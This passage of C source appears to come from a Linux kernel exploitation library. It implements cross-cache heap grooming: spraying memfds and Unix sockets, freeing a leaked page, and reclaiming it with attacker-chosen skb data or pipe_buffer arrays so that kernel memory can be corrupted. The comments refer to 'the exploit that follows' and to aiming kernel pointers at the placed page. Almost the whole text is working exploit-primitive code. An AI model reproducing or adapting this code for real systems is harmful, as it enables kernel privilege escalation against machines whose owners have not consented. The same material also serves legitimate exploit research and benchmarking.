		msv = calloc(nspray, sizeof(*msv));
		if (!msv) { free(payload); return 0; }
		for (size_t i = 0; i < nspray; i++) {
			msv[i][0] = msv[i][1] = -1;
			if (socketpair(AF_UNIX, SOCK_STREAM, 0, msv[i]) < 0) {
				pr_error("crosscache: stream-multi refill socketpair failed\n");
				free(msv); free(payload); return 0;
			}
			int sndbuf = 1 << 20;
			setsockopt(msv[i][0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof sndbuf);
			int fl = fcntl(msv[i][0], F_GETFL, 0);
			if (fl >= 0) fcntl(msv[i][0], F_SETFL, fl | O_NONBLOCK);
		}
	} else if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
		pr_error("crosscache: stream refill socketpair failed\n");
		free(payload); return 0;
	} else {
		int sndbuf = 1 << 20;
		setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof sndbuf);
		int fl = fcntl(sv[0], F_GETFL, 0);
		if (fl >= 0) fcntl(sv[0], F_SETFL, fl | O_NONBLOCK);
	}
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv) < 0) {
		pr_error("crosscache: socketpair failed\n");
		if (multi) { for (size_t i=0;i<nspray;i++){close(msv[i][0]);close(msv[i][1]);} free(msv); }
		else { close(sv[0]); close(sv[1]); }
		free(payload); return 0;
	}
	cc_send(pcp_sv, order_size * 2, NULL, 0);
	cc_pin(cc_cfg.core);
	cc_yield4();
	for (size_t i=0;i<cc_pre.cnt;i++)  if(cc_pre.memfds[i]>0) { close(cc_pre.memfds[i]); cc_pre.memfds[i]=-1; }
	for (size_t i=0;i+1<cc_post.cnt;i++) if(cc_post.memfds[i]>0) { close(cc_post.memfds[i]); cc_post.memfds[i]=-1; }
	for (size_t i=0;i<cc_spray.cnt;i+=ops) if(cc_spray.memfds[i]>0) { close(cc_spray.memfds[i]); cc_spray.memfds[i]=-1; }
	close(pcp_sv[0]); close(pcp_sv[1]);
	cc_yield4();
	/* The page is surrendered here, and retaken by the sends below. */
	if (cc_leak_memfd>0){ close(cc_leak_memfd); cc_leak_memfd=-1; }
	/* The send below is gated on a fixed delay, not a timing signal: a real
	 * timing gate needs cves/lib/base/cycles.h's cycle counter, a probe with
	 * the SAME object type the real spray uses, grown one-per-iteration, and
	 * a threshold calibrated for the exact target (cves/bench/crosscache.c
	 * --calibrate-signal) run on hardware -- none of which this does. */
	cc_yield4();
	if (multi) {
		/* One clean, marker-safe send per independent socket -- direct's own
		 * shape, over a stream socket instead of a datagram. */
		for (size_t i = 0; i < nspray; i++)
			send(msv[i][0], payload, r->send_bytes, MSG_DONTWAIT);
	} else {
		/* A stream send can accept less than asked and does not queue a second
		 * message the way a datagram does, so a caller that wants more than one
		 * attempt at the same reclaim repeats the send rather than opening
		 * more sockets -- stopping at the first one that does not go through,
		 * since nothing past that point is still racing for the same page. */
		for (size_t i = 0; i < nspray; i++) {
			ssize_t sent = send(sv[0], payload, r->send_bytes, MSG_DONTWAIT);
			if (sent <= 0)
				break;
		}
	}
	free(payload);

	if (multi) {
		cc_skb_sv[0] = msv[0][0];
		cc_skb_sv[1] = msv[0][1];
		cc_content_sv = msv; cc_content_n = nspray;
	} else {
		cc_skb_sv[0] = sv[0];
		cc_skb_sv[1] = sv[1];
	}
	pr_info("crosscache: stream place x%zu at base=%#lx (multi=%d)\n", nspray,
		(unsigned long)cc_base, multi);
	return cc_base;
}

/* Refills the leaked page with real pipe_buffer arrays, over a stream hold,
 * no shaping pass -- a configuration with rounds=0.
 *
 * The drain and reclaim pools are built here, in the caller's process,
 * before anything is forked; the fork that follows runs the leak
 * (with_pipes=0, pools already made) in a clean child that inherits them
 * ready-made. Building the pools before the fork, in a process that does not
 * itself run the mm_struct leak's clone/kill/hold sequence, keeps that
 * sequence from sharing a process with hundreds of pipe() calls.
 *
 * The child parks after reporting `base` back over a pipe, holding the
 * resized reclaim pipes open: the exploit that follows needs those pipes to
 * keep existing, and a process that might still be doing other things is not
 * a safe thing to trust with that. crosscache_cleanup() reaps this child; a
 * caller that grooms again without calling cleanup() first accumulates one
 * parked process per groom. */
static uintptr_t cc_place_pipe_bare(const struct crosscache_request *r)
{
	cc_cfg = r->cfg;
	size_t pops = cc_cfg.pipe_objs_per_slab;
	cc_drain_cnt = pops * cc_cfg.pipe_drain_slabs;
	cc_reclaim_cnt = pops * cc_cfg.pipe_reclaim_slabs;
	cc_drain = cc_make_pipes(cc_drain_cnt);
	cc_reclaim = cc_make_pipes(cc_reclaim_cnt);
	if (!cc_drain || !cc_reclaim) {
		pr_error("crosscache: pipe-bare pool alloc failed\n");
		return 0;
	}

	int result_pipe[2];
	if (pipe(result_pipe) < 0) {
		pr_error("crosscache: pipe-bare result pipe failed\n");
		return 0;
	}
	pid_t child = (pid_t)syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
	if (child < 0) {
		pr_error("crosscache: pipe-bare fork failed\n");
		close(result_pipe[0]); close(result_pipe[1]);
		return 0;
	}
	if (child == 0) {
		close(result_pipe[0]);
		int held_sv[2];
		uint64_t base = cc_leak_base_stream(&cc_cfg, held_sv, 0);
		if (base) {
			if (r->inspect)
				r->inspect(CROSSCACHE_STAGE_HELD, cc_leaked_object,
					  (uintptr_t)base, r->user);
			for (size_t i = 0; i < cc_drain_cnt; i++)
				cc_alloc(cc_drain[i]);
			cc_pin(cc_cfg.core);
			close(held_sv[0]);
			close(held_sv[1]);
			for (size_t i = 0; i < cc_reclaim_cnt; i++)
				cc_alloc(cc_reclaim[i]);
			pr_info("crosscache: pipe-bare place at base=%#lx (%zu reclaim pipes, "
				"no shape pass, forked child)\n",
				(unsigned long)base, cc_reclaim_cnt);
		}
		ssize_t w = write(result_pipe[1], &base, sizeof(base));
		(void)w;
		close(result_pipe[1]);
		for (;;) pause();
	}

	close(result_pipe[1]);
	uint64_t base = 0;
	ssize_t got = read(result_pipe[0], &base, sizeof(base));
	close(result_pipe[0]);
	if (got != (ssize_t)sizeof(base)) {
		pr_error("crosscache: pipe-bare child did not report a base\n");
		kill(child, SIGKILL); waitpid(child, NULL, 0);
		return 0;
	}
	if (!base) {
		kill(child, SIGKILL); waitpid(child, NULL, 0);
		return 0;
	}
	cc_pipe_bare_child = child;
	cc_base = (uintptr_t)base;
	return cc_base;
}

static const struct crosscache_method cc_method_table[] = {
	{ "swap", "holds the page with filler, reads the address, then exchanges it again",
	  "the caller owns the victim and can free it on its own schedule",
	  cc_place_swap },
	{ "direct", "reads the address while the victim is alive, then gives the page up once",
	  "the caller owns the victim and can read its address before freeing it",
	  cc_place_direct },
	{ "stream", "same as direct, refilled over a stream socket instead of a datagram",
	  "the receiving allocator needs a stream send's own shaping to take the page",
	  cc_place_stream },
	{ "pipe-bare", "refills with real pipe_buffer arrays over a stream hold, no shape pass",
	  "the consumer wants a kernel object at the page rather than its own bytes, and "
	  "does not need to verify placement before corrupting it "
	  "(a caller supplies no `compose` for this one, only `cfg`)",
	  cc_place_pipe_bare },
};

const struct crosscache_method *crosscache_methods(size_t *count)
{
	if (count)
		*count = sizeof(cc_method_table) / sizeof(cc_method_table[0]);
	return cc_method_table;
}

const struct crosscache_method *crosscache_method_named(const char *name)
{
	size_t n;
	const struct crosscache_method *m = crosscache_methods(&n);

	for (size_t i = 0; name && i < n; i++)
		if (!strcmp(m[i].name, name))
			return &m[i];
	return NULL;
}

uintptr_t crosscache_place_with(const struct crosscache_method *method,
                                const struct crosscache_request *request)
{
	if (!method || !request)
		return 0;
	/* `send_bytes` is not checked here: a method that refills with a kernel
	 * object rather than the caller's own bytes (`pipe-bare`) does not use it
	 * at all, and one that does (every other method) already rejects a zero
	 * length itself, inside crosscache_content_reclaim -- this guard was
	 * redundant for them and wrong for the one it excluded. */
	return method->place(request);
}

void crosscache_cleanup(void)
{
	if (cc_content_sv) { for (size_t i=0;i<cc_content_n;i++){ if(cc_content_sv[i][0]>=0)close(cc_content_sv[i][0]); if(cc_content_sv[i][1]>=0)close(cc_content_sv[i][1]); } free(cc_content_sv); cc_content_sv=NULL; cc_content_n=0; cc_skb_sv[0]=cc_skb_sv[1]=-1; }
	if (cc_skb_sv[0]>=0) close(cc_skb_sv[0]);
	if (cc_skb_sv[1]>=0) close(cc_skb_sv[1]);
	cc_skb_sv[0]=cc_skb_sv[1]=-1;
	int (*pools[])[2] = { cc_n, cc_c, cc_e, cc_drain, cc_reclaim };
	size_t cnts[] = { cc_n_cnt, cc_c_cnt, cc_e_cnt, cc_drain_cnt, cc_reclaim_cnt };
	for (int p=0;p<5;p++) if (pools[p]) { for (size_t i=0;i<cnts[p];i++){ if(pools[p][i][0]>=0)close(pools[p][i][0]); if(pools[p][i][1]>=0)close(pools[p][i][1]); } free(pools[p]); }
	cc_n=cc_c=cc_e=cc_drain=cc_reclaim=NULL;
	/* Close every descriptor the groom opened and the sequence did not.
	 *
	 * The spray holds one open descriptor per sprayed address space -- over a
	 * thousand of them -- and only a fraction are closed as part of the
	 * sequence. Freeing the arrays without closing the rest leaks that many
	 * descriptors per groom, which a consumer that grooms once never notices
	 * and a consumer that grooms twice fails on. */
	struct cc_ctx *ctxs[] = { &cc_prep, &cc_spray, &cc_pre, &cc_post };
	for (size_t c = 0; c < sizeof(ctxs)/sizeof(ctxs[0]); c++) {
		struct cc_ctx *x = ctxs[c];
		if (x->memfds) for (size_t i=0;i<x->cnt;i++) if (x->memfds[i]>0) close(x->memfds[i]);
		/* A child that outlived the sequence would keep its address space
		 * alive, which is the object the next groom is trying to place. */
		if (x->childs) for (size_t i=0;i<x->cnt;i++)
			if (x->childs[i]>0) { kill(x->childs[i],SIGKILL); waitpid(x->childs[i],NULL,0); }
		free(x->childs); free(x->memfds);
		memset(x,0,sizeof(*x));
	}
	if (cc_leak_memfd>0) { close(cc_leak_memfd); cc_leak_memfd=-1; }
	/* pipe-bare's leak runs in a forked child that parks holding the
	 * reclaimed pipes (see cc_place_pipe_bare); reaping it here is what lets
	 * a caller that grooms again -- the bench, thirty times over -- start
	 * clean instead of accumulating one parked process per round. A
	 * consumer keeping the placement past this call calls
	 * crosscache_place_with() again before ever calling this, so nothing
	 * here forces an early cleanup on it. */
	if (cc_pipe_bare_child > 0) {
		kill(cc_pipe_bare_child, SIGKILL);
		waitpid(cc_pipe_bare_child, NULL, 0);
		cc_pipe_bare_child = -1;
	}
	cc_base = 0;
}

int crosscache_stamp_self(void *payload, size_t len, size_t off, uintptr_t base)
{
	uint64_t v = (uint64_t)base;

	if (!payload || off > len || len - off < sizeof(v))
		return -1;
	memcpy((unsigned char *)payload + off, &v, sizeof(v));
	return 0;
}

int crosscache_detach_hold(int out[2])
{
	/* Hand the descriptors that keep the placed page alive to the caller, so a
	 * cleanup before the next groom does not release the page.
	 *
	 * A caller that must keep a placed page reachable across further grooms --
	 * one measuring several placements, or one that aimed a kernel pointer at a
	 * page and has not yet aimed it elsewhere -- needs the page to outlive the
	 * module state that produced it. Releasing it early leaves that pointer on
	 * freed memory. */
	if (cc_skb_sv[0] < 0 && cc_skb_sv[1] < 0)
		return -1;
	out[0] = cc_skb_sv[0];
	out[1] = cc_skb_sv[1];
	cc_skb_sv[0] = cc_skb_sv[1] = -1;
	/* The array that recorded them is the module's; the descriptors are now the
	 * caller's, so drop the rest of the array without closing the pair. */
	if (cc_content_sv) {
		for (size_t i=0;i<cc_content_n;i++) {
			int a = cc_content_sv[i][0], b = cc_content_sv[i][1];
			/* The handed-over pair is one of these entries; close every other
			 * one. Both members are compared because which entry holds the
			 * placed page is the reclaim's choice, not this function's. */
			if (a==out[0]||a==out[1]||b==out[0]||b==out[1]) continue;
			if (a>=0) close(a);
			if (b>=0) close(b);
		}
		free(cc_content_sv); cc_content_sv=NULL; cc_content_n=0;
	}
	return 0;
}

uintptr_t crosscache_place(const struct crosscache_cfg *cfg,
			   const void *tmpl, size_t len, size_t nspray,
			   const struct crosscache_verify *verify,
			   unsigned attempts, struct crosscache_report *report)
{
	struct crosscache_report r;
	unsigned char seen[256];

	memset(&r, 0, sizeof(r));
	if (attempts == 0)
		attempts = 1;
	/* Without a verifier there is nothing to retry on: a second attempt
	 * would be as blind as the first and would only free the page the
	 * caller may already be relying on. */
	if (!verify || !verify->read)
		attempts = 1;
	if (verify && verify->probe_len > sizeof(seen)) {
		pr_error("crosscache: probe of %zu bytes exceeds the read buffer\n",
			 verify->probe_len);
		return 0;
	}

	for (unsigned i = 0; i < attempts; i++) {
		uintptr_t base;

		r.attempts++;
		base = cc_groom(cfg, 0);
		if (!base) {
			/* No address at all: either the leak failed or it named
			 * something that is not a linear-map pointer. The groom
			 * reports which; both mean nothing was placed. */
			r.mis_shaped++;
			continue;
		}
		r.leaks++;
		r.base = base;
		if (crosscache_content_reclaim(tmpl, len, nspray)) {
			pr_warning("crosscache: reclaim failed at %#lx\n", (unsigned long)base);
			continue;
		}
		if (!verify || !verify->read) {
			r.unverified++;
			if (report)
				*report = r;
			return base;
		}
		if (verify->read(verify->ctx, base + verify->probe_off, seen,
				 verify->probe_len) != 0) {
			pr_warning("crosscache: could not read back %#lx\n", (unsigned long)base);
			continue;
		}
		if (memcmp(seen, verify->expect, verify->probe_len) == 0) {
			r.landings++;
			if (report)
				*report = r;
			pr_success("crosscache: confirmed at %#lx after %u attempt(s)\n",
				   (unsigned long)base, r.attempts);
			return base;
		}
		/* The page is not ours. Whatever is there was not placed by
		 * this run, so the address is discarded rather than written to,
		 * and the next attempt grooms afresh. */
		crosscache_cleanup();
	}

	if (report)
		*report = r;
	pr_warning("crosscache: no confirmed placement in %u attempt(s) "
		   "(%u leaked, %u mis-shaped)\n", r.attempts, r.leaks, r.mis_shaped);
	return 0;
}
